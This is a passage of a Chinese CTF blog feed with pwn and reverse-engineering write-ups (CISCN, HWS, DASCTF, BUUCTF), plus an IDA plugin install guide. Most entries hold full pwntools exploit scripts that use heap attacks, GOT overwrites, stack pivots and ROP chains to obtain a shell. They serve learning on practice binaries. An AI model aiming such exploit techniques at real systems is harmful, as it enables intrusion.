free"></a>no free</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><pre><code class="python">*] &#39;/ctf/work/ciscn2020/pwn/nofree/pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>可以看到保护开的还是很少的，然后no free 明显需要使用到hos of orange进行攻击了。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li>只能申请0-0x90大小的堆块，堆块号自定义0-2，且由于没有对已经存在的堆块号验证，可以进行无限次的申请同一个序号的堆块。</li><li>堆块地址存在于<code>0x06020C0  + 0x100</code> size 跟在后面。</li><li><code>strdup</code> 相当于<code>malloc(stren(s))</code> </li></ul><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><ul><li>倘若输入没有存在的堆块idx，程序会直接返回</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>难点基本就在泄漏libc了。</p><ul><li>利用程序的堆溢出漏洞，修改一下top chunk</li><li>申请多次0号0x90的堆块，来消耗修改后的top chunk，到达一定程度后进行hos of orange攻击，获取一个空闲的进入fastbin的堆块</li><li>利用堆溢出，在fastbin chain上加一个<code>0x06020C0  + 0x100</code> ，准备进行fastbin attack，来获取一个在存放堆块地址的堆块，这样就实现了任意地址写。</li><li>修改<code>atoi</code> 的got 表为 printf，创造出一个格式化字符串漏洞</li><li>利用add中的atoi，完成格式化字符串漏洞的利用，泄漏出libc地址</li><li>利用格式化字符串漏洞，修改<code>atoi</code> 的got表为<code>elf.plt[&#39;atoi&#39;] + 6</code> ，让其完成一下解析，重新构造出正常的atoi（原因：测速中发现，用edit功能输入idx后直接退出，只能让其恢复正常，再进行任意地址写）</li><li>修改<code>atoi</code> 的got为system的地址，然后在发送个<code>sh</code> ，完成<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def edit(idx,data):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&quot;content&quot;,str(data))payload = &#39;a&#39; * 0x40add(0,0x90,payload)payload = &#39;a&#39; * 0x40 + p64(0) + p64(0xfb1)edit(0,payload)payload = &#39;a&#39; * 0x90for i in range(24):    add(0,0x90,payload)payload = &#39;a&#39; * 0x10add(1,0x90,payload)payload = &#39;a&#39; * 0x70add(0,0x70,payload)payload = &#39;\x00&#39; * 0x18 + p64(0x71) + p64(0x6020C0 + 0x100)edit(1,payload)payload = 0x60 * &#39;a&#39;add(0,0x70,payload)add(0,0x90,payload)payload = p64(0x0000000000602058) + p64(0x90)edit(0,payload)edit(1,p64(elf.plt[&#39;printf&#39;]))sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%7$s&#39; + p64(0x000000000602018)sa(&#39;idx&#39;,payload)r(4)r(4)libc_base = uu64(r(6)) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)sys = libc_base + libc.sym[&#39;system&#39;]sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%82c&#39; + &#39;%8$hhn11&#39; + p64(0x000000000602058)sa(&#39;idx&#39;,payload)edit(1,p64(sys))s(&#39;sh&#39;)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;cicsn-2020初赛部分题目&quot;&gt;&lt;a href=&quot;#cicsn-2020初赛部分题目&quot; class=&quot;headerlink&quot; title=&quot;cicsn 2020初赛部分题目&quot;&gt;&lt;/a&gt;cicsn 2020初赛部分题目&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>安恒HWS夏令营选拔赛部分题目</title>
    <link href="http://chumen77.xyz/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/08/16/无标题/</id>
    <published>2020-08-16T11:12:38.871Z</published>
    <updated>2020-08-17T13:55:03.167Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒HWS夏令营选拔赛部分题目"><a href="#安恒HWS夏令营选拔赛部分题目" class="headerlink" title="安恒HWS夏令营选拔赛部分题目"></a>安恒HWS夏令营选拔赛部分题目</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考：<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>注意网卡那块，要对应自己虚拟机网卡的情况。</p><h5 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h5><pre><code class="python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot;  -net nic -net tap</code></pre><h4 id="把虚拟机中要分析的maze文件取出来"><a href="#把虚拟机中要分析的maze文件取出来" class="headerlink" title="把虚拟机中要分析的maze文件取出来"></a>把虚拟机中要分析的maze文件取出来</h4><pre><code class="bash">scp -r /path/maze username@servername:/path </code></pre><h4 id="使用ghidra进行分析"><a href="#使用ghidra进行分析" class="headerlink" title="使用ghidra进行分析"></a>使用ghidra进行分析</h4><pre><code class="bash">  fgets(buf,0x28,_stdin);  len = strlen(buf);  uStack68 = 0x20;  if (*(char *)((int)&amp;uStack68 + len + 3) == &#39;\n&#39;) {    *(undefined *)((int)&amp;uStack68 + len + 3) = 0;    len = len - 1;  }  if (len != 0x20) {    eorr();  }</code></pre><p>这一段可以确定让输入的是32个字符。</p><pre><code class="c">void FUN_004006f0(void){  int i;  int j;  i = 0;  while (i &lt; DAT_16) {    j = 0;    while (j &lt; 8) {      maze[i * 8 + j] =           (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt;                 (7U - j &amp; 0x1f));      j = j + 1;    }    i = i + 1;  }  return;}</code></pre><p>可以看到迷宫是在运行时根据部分数据，来生成的。并且其中一行是8个数据，一列是16个，一共128个数据。</p><p>可以使用gdb，断点在这个函数之后，把迷宫提取出来。提取出来的都是0x1 和 0x0<br>组成的迷宫。</p><p>进入控制走位的函数：</p><pre><code class="c">  heng = 1;  shu = 0;  pcStackX0 = param_1</code></pre><p>这个地方控制说，起先起点是第1行的第2个位置。</p><p>check函数，主要是看你是不是在移动后，走到了0上，走到的话，程序就判你失败。</p><p>往下看，发现主要判断：</p><pre><code class="c">          if (cVar1 != &#39;U&#39;) {LAB_00400ad4:            if ((heng == 1) &amp;&amp; (shu == 10)) {              uVar3 = 1;            }            else {              uVar3 = 0;            }</code></pre><p>在这一段，可以确定走到第11列的第2个数字即可。</p><h4 id="提取迷宫图并处理"><a href="#提取迷宫图并处理" class="headerlink" title="提取迷宫图并处理"></a>提取迷宫图并处理</h4><h5 id="脚本提取"><a href="#脚本提取" class="headerlink" title="脚本提取"></a>脚本提取</h5><pre><code class="c">data=&quot;AMz1nG~#--Ma7e~&quot;data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1]maze=[]lie=0while lie&lt;15:    hang=0    while hang&lt;8:        # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f))        hang+=1    lie+=1print(maze)</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>就这迷宫，我看了好一会才能走好。🤣🤣服了自己，老以为是数据提取错了。</p><pre><code class="bash">flag = md5{DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU}</code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><ul><li>格式化字符串漏洞，可以用来泄漏。</li><li>栈溢出，只能1个gadget。</li></ul><h5 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h5><h6 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h6><p>只能溢出一个gadget，肯定是打栈迁移，但是跟以往的栈迁移不同的是，这一个gadget只能溢出到rbp，并不能覆盖到ret address，所以只能覆盖好rbp后，利用程序走出这个函数后，将要结束程序时的<code>leave ret</code> 。</p><p>但是需要注意的是因为在走过一次 <code>leave ret</code>时，此时的rbp已经被改了，再过程序的第二个leave ret 前，需要过一下canary的检测:</p><pre><code class="bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (&#39;8&#39;)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (&#39;x&#39;)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre><p>看这里，在取数值时，其在你迁移的bss段读取数值到rdx进行判断的，所以在第一次往bss段读的时候，填充好canary的值。</p><p>并且这个题，在看got表到bss段的距离也是很近的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>所以在迁移的时候需要注意，从有实际意义的函数（比如puts）开始前就得把栈抬高。否则在进入libc的内部调用函数时，会因为各种push pop 而修改到got处的东西，导致不仅泄漏的数值有问题，并且容易让程序崩掉。</p><pre><code class="bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()</code></pre><p>此处就可以泄漏出puts函数的libc地址，但是由于出题人想考察<code>ret2dl_runtime_resolve</code>,所以应该是魔改了libc。</p><p>然后可以使用DynELF来搞定，参考群里师傅分享的exp。</p><h6 id="Dynelf函数怎么写"><a href="#Dynelf函数怎么写" class="headerlink" title="Dynelf函数怎么写"></a>Dynelf函数怎么写</h6><p>由于程序只有puts函数来输出，就用puts函数来进行泄漏。</p><pre><code class="python">payload = p64(0) * 57 +p64(canary) * 2  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre><p>本来我是这样写的，但是发现程序还是会崩，由于程序情况的限制，栈只能提高<code>0x1b0</code>这样，还是不够用。</p><p>还是就想办法提升栈，往高点的bss上写入rop进行想要的操作。</p><p>这个就在Dynelf前写好,用rop控制参数，调用read函数来往高点的bss段进行写payload，并且最后用pop rsp的操作，把写好rop chain的bss的地址pop 到rsp上，然后再ret上去：</p><pre><code class="python">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()</code></pre><p>接着就是用这写好好的rop chain，进行泄漏地址，为了Dynelf多次调用泄漏，在泄漏地址后，跟上read函数继续往这段地址上读取同样的rop chain，然后再次控制rsp，接着ret到对应的位置：</p><pre><code class="python">def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data</code></pre><p>可以看到是提高了0x500个字节的地方进行rop，做好用控制rsp，ret后进行反复横跳跃，完成对system 的寻找。感觉这是很好的办法，因为栈迁移的核心还是控制rsp，最初学习是见过2次栈迁移的题目，当时用的还是leave ret 来进行的控制，现在看到直接使用pop rsp 来控制，的确是方便又简单的办法。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *# from LibcSearcher import *s = process(&quot;./pwn&quot;)# s = remote(&quot;183.129.189.61&quot;,54900)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level=&#39;debug&#39;def debug():    # gdb.attach(proc.pidof(s)[0],gdbscript=&#39;b main&#39;)    gdb.attach(s)    pause()pop_rdi = 0x0000000000400963pop_rsi_r15 = 0x0000000000400961pop_rsp_3 = 0x000000000040095dleave_ret = 0x00000000004007dccontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]read_plt = elf.plt[&#39;read&#39;]bss = 0x6010a0s.sendafter(&quot;canary &#39; s @ # $ % ^ &amp; * :\n&quot;, &quot;%9$p&quot;)canary = int(s.recvline(keepends=False), 16)success(hex(canary))context.arch = &#39;amd64&#39;def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadebug()payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(&#39;system&#39;,&#39;libc&#39;)success(hex(system))payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system)s.send(payload)s.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒HWS夏令营选拔赛部分题目&quot;&gt;&lt;a href=&quot;#安恒HWS夏令营选拔赛部分题目&quot; class=&quot;headerlink&quot; title=&quot;安恒HWS夏令营选拔赛部分题目&quot;&gt;&lt;/a&gt;安恒HWS夏令营选拔赛部分题目&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="IOT" scheme="http://chumen77.xyz/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>MacOS安装IDA插件keypatch</title>
    <link href="http://chumen77.xyz/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <id>http://chumen77.xyz/2020/08/10/MacOS安装IDA插件keypatch/</id>
    <published>2020-08-10T09:23:15.104Z</published>
    <updated>2020-08-10T15:11:27.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOS安装IDA插件keypatch"><a href="#MacOS安装IDA插件keypatch" class="headerlink" title="MacOS安装IDA插件keypatch"></a>MacOS安装IDA插件keypatch</h1><p>macOS 安装官方介绍的安装方式不太行。网上参考后记录一下。</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><pre><code class="bash">brew install cmake</code></pre><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><pre><code class="bash">git clone https://github.com/fjh658/keystone-engine.gitcd keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre><p>此时在安装后的最后几段代码中，找到类似：</p><pre><code class="bash">/Library/Python/2.7/site-packages/keystone</code></pre><p>这是本地python2.7的路径。</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><pre><code class="bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre><pre><code class="bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre><p>现实拒绝的话，可以</p><pre><code class="bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre><pre><code class="bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre><p>然后进入ida使用即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MacOS安装IDA插件keypatch&quot;&gt;&lt;a href=&quot;#MacOS安装IDA插件keypatch&quot; class=&quot;headerlink&quot; title=&quot;MacOS安装IDA插件keypatch&quot;&gt;&lt;/a&gt;MacOS安装IDA插件keypatch&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(7th)</title>
    <link href="http://chumen77.xyz/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <id>http://chumen77.xyz/2020/07/25/DASCTF安恒月赛(7th)/</id>
    <published>2020-07-25T13:50:36.163Z</published>
    <updated>2020-08-10T03:50:16.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-7th"><a href="#DASCTF安恒月赛-7th" class="headerlink" title="DASCTF安恒月赛(7th)"></a>DASCTF安恒月赛(7th)</h1><p>只做出个签到题，tcl。。。</p><h2 id="虚假的签到题"><a href="#虚假的签到题" class="headerlink" title="虚假的签到题"></a>虚假的签到题</h2><p>简单的栈溢出，但是出题人估计是用了GCC&gt;=4.9版本，故意给这个Stack Buffer Overflow 设置难度。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code> 0x80485fd &lt;main+104&gt;:        mov    ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;:        leave 0x8048601 &lt;main+108&gt;:        lea    esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;:        ret</code></pre><p>这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。并且调试可以发现，如果我们直接overflow了 esp，那么会造成奇怪的影响。</p><p>试着分析一下：</p><ul><li>想要控制esp，就得控制ecx</li><li>想要控制ecx，就得至少控制到ebp-0x4的位置</li></ul><p>由于是gets的获取输入，这个明显很容易实现。</p><p>核心就是让：</p><pre><code>[ [ebp-0x4] - 0x4] = address(backdoor)</code></pre><p>附上成功时栈情况,断点在0x80485fd ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>由于栈随机化，其中需要用格式化字符串漏洞泄漏<code>[ebp-0x4]</code>，来获取在<br>ebp-0x4的位置填入什么值合适，从而完成攻击。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./qiandao&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10013)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()one = 0x804857D# debug()payload = &#39;%13$p&#39;sla(&#39;name&#39;,payload)ru(&#39;0x&#39;)key = int(r(8),16) - 0x40 + 0x8info_addr(&#39;key&#39;,key)payload = p32(one)*9 + p32(key)sla(&quot;?&quot;,payload)itr()</code></pre><p>多调试，会更容易理解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-7th&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-7th&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛(7th)&quot;&gt;&lt;/a&gt;DASCTF安恒月赛(7th)&lt;/h1&gt;&lt;p&gt;只做出个签到题，tcl。。。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF暑假刷题(1)</title>
    <link href="http://chumen77.xyz/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/07/10/BUUCTF暑假刷题/</id>
    <published>2020-07-10T13:16:13.644Z</published>
    <updated>2020-09-02T03:42:38.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF暑假刷题-1"><a href="#BUUCTF暑假刷题-1" class="headerlink" title="BUUCTF暑假刷题(1)"></a>BUUCTF暑假刷题(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>静态链接。32位程序。用<code>int 80h</code> 这个中断调用，呼叫系统调用程序<code>system_call()</code>.。</p><p>然后rop 控制EAX = 0Xb = 11，EBX = &amp;(“/bin/sh”), ECX = EDX = 0，即执行了<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>，即可拿到shell。</p><p>32位系统调用表：<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./simplerop&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29124)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()offset = 32start = 0x8048E45read = 0x806CD50pop_eax_ret = 0x080bae06pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806e851pop_edx_ret = 0x0806e82apop3_ret = 0x08048913bss = 0x80EC2EC - 0x10ret = 0x8048E6Fin_t_0x80 = 0x080493e1payload = &#39;a&#39; * offset + flat([read,pop3_ret,0,bss,0x8])payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80])sa(&#39;:&#39;,payload)s(&#39;/bin/sh\x00&#39;)itr()</code></pre><p>其中rop链read后返回地址：<code>pop3_ret</code>，是为了pop <code>0,bss,0x8</code>，然后再跟着rop。</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞。</p><pre><code class="c">int __cdecl rec_str_free(void *ptr){  free(*((void **)ptr + 2));  free(ptr);  return puts(&quot;Note freed!&quot;);}</code></pre><p>每创建一个堆，就有一个0x10的堆空间，存放函数指针。一看到这个，就可以说是暗示攻击这个地方来劫持程序流程。</p><pre><code class="c">int do_del(){  int v0; // eax  v0 = ask((int)&quot;Index&quot;);  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);}</code></pre><p>利用这个函数来劫持程序流程。<br>先<code>new(0,2,0x40,payload)</code>看一下程序的内存情况, 对于其中的<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ：</p><pre><code class="c">gef➤  p &amp;records$1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt;gef➤  x/wx 0x804b0800x804b080 &lt;records&gt;:    0x08635160gef➤  x/wx 0x086351600x8635160:      0x080486de</code></pre><p>所以 <code>records[v0]</code>  = 0x08635160 </p><pre><code class="c">gef➤  x/wx 0x08635160+40x8635164:      0x08048725gef➤  x/i 0x08048725   0x8048725 &lt;rec_str_free&gt;:    push   ebp</code></pre><p>所以 